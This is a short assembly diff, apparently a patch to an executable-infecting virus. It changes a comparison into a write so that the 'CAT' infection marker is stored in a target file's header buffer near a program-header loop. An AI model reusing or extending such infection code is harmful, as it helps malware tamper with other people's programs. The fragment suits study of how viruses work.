@@ -196,7 +196,7 @@ marker:
     mov dword [edi+2080+8], ecx
 
     mov ecx, 0x00544143             ; "CAT "in little-endian, second part of the infected marker
-    cmp dword [edi+2080+12], ecx
+    mov dword [edi+2080+12], ecx
 
 ; initialize for program_header_loop
     xor ecx, ecx
